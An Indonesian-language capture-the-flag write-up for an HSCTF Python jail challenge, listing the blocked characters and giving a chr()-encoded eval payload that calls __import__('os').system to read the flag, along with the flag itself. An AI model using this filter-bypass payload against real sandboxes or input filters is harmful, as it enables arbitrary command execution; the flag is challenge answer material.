## Diketahui
Koneksi python jail dengan koneksi `nc paas.hsctf.com 1337`

Setelah itu coba inputkan karakter namun terdapat filter diantaranya
> `'`, `"`, `_`, `[`, `]`, `.`

Namun disini terdapat fungsi eval yang tidak dilakukan filter, operator `+`, dan juga `()`

## Solusi
Bypass dengan cara menggunakan modul __import__ untuk memanggil `os system` dan mendapatkan flagnya, namun payload tersebut perlu dirubah ke unicode code / ord dan dimasukkan kedalam fungsi eval

> eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(39)+chr(41))

Flag = flag{vuln3r4b1l17y_45_4_53rv1c3}